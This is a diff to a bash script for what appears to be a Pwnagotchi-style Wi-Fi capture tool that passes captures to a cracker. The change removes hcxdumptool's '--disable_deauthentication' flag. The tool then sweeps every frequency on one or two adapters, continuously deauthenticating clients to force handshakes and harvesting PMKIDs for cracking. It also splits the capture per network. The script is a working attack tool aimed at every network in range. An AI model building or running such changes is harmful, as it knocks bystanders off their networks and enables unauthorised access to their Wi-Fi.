@@ -6,7 +6,7 @@
 # Sly already reads them, so cracking needs no change.
 #
 # Config is read from /tmp/fennec-scout/config.json (written by scout_engine.py):
-#   mode     : "wide" (PMKID + opportunistic, no deauth)
+#   mode     : "wide" — sweep all frequencies, continuous deauth + PMKID/handshake capture
 #   adapters : list of monitor-capable interfaces to use (1 or 2)
 #
 # Stats for the launcher are written to /tmp/fennec-scout/stats.json.
@@ -20,6 +20,7 @@ RUN_DIR=/tmp/fennec-scout
 CONFIG="$RUN_DIR/config.json"
 STATS="$RUN_DIR/stats.json"
 PCAP="$RUN_DIR/scout.pcapng"
+PCAP5="$RUN_DIR/scout-5g.pcapng"
 HANDSHAKES=/etc/pwnagotchi/handshakes
 
 # EU channel plan. One adapter sweeps everything; two split the bands.
@@ -29,7 +30,7 @@ BANDALL="$BAND24,$BAND5"
 
 mkdir -p "$RUN_DIR"
 chmod 755 "$RUN_DIR"
-rm -f "$PCAP"
+rm -f "$PCAP" "$PCAP5" "$RUN_DIR/merged.pcapng"
 mkdir -p "$HANDSHAKES"
 
 [ -f "$CONFIG" ] || { echo "no config"; exit 1; }
@@ -78,26 +79,20 @@ json.dump({"mode": sys.argv[2], "status": "running",
 PY
 chmod 644 "$STATS" 2>/dev/null
 
-hcx_capture() {   # $1 interface, $2 "" for all-frequency sweep, else channel list
-    local i="$1" ch="$2"
-    local chopt=(-F)
-    [ -n "$ch" ] && chopt=(-c "$ch")
-    # Always run hcxdumptool in its reliable passive-capture mode (the mode that
-    # works): it harvests PMKIDs and records any 4-way handshake on the channel.
-    hcxdumptool -i "$i" -w "$PCAP" "${chopt[@]}" --disable_deauthentication \
-        >> "$RUN_DIR/run.log" 2>&1 &
+hcx_capture() {   # $1 interface, $2 output pcapng
+    # Sweep every supported frequency (-F) and let hcxdumptool deauth continuously
+    # (its default), so handshakes are forced automatically like Pwnagotchi, no
+    # interaction needed. PMKIDs are harvested at the same time.
+    hcxdumptool -i "$1" -w "$2" -F >> "$RUN_DIR/run.log" 2>&1 &
     pids+=($!)
 }
 
 if [ -n "$IFACE2" ]; then
-    # Two adapters: split the bands (loop reads IFACE1's capture).
-    hcx_capture "$IFACE1" "$BAND24"
-    hcxdumptool -i "$IFACE2" -w "${PCAP%.pcapng}-5g.pcapng" -c "$BAND5" \
-        --disable_deauthentication >> "$RUN_DIR/run.log" 2>&1 &
-    pids+=($!)
+    # Two adapters: both sweep in parallel; their captures are merged below.
+    hcx_capture "$IFACE1" "$PCAP"
+    hcx_capture "$IFACE2" "$PCAP5"
 else
-    # One adapter sweeps every supported frequency (2.4 + 5 GHz).
-    hcx_capture "$IFACE1" ""
+    hcx_capture "$IFACE1" "$PCAP"
 fi
 
 sanitize() { echo "$1" | tr -c 'A-Za-z0-9._-' '_' | cut -c1-32 | sed 's/^_*//; s/_*$//'; }
@@ -116,7 +111,6 @@ decode_ssid() {
 # Split the rolling capture into one pcap per network for Sly, and refresh stats.
 while true; do
     sleep 10
-    PCAP5="${PCAP%.pcapng}-5g.pcapng"
     [ -s "$PCAP" ] || [ -s "$PCAP5" ] || continue
     # With two adapters each writes its own band; merge them so both are analysed.
     SRC="$PCAP"
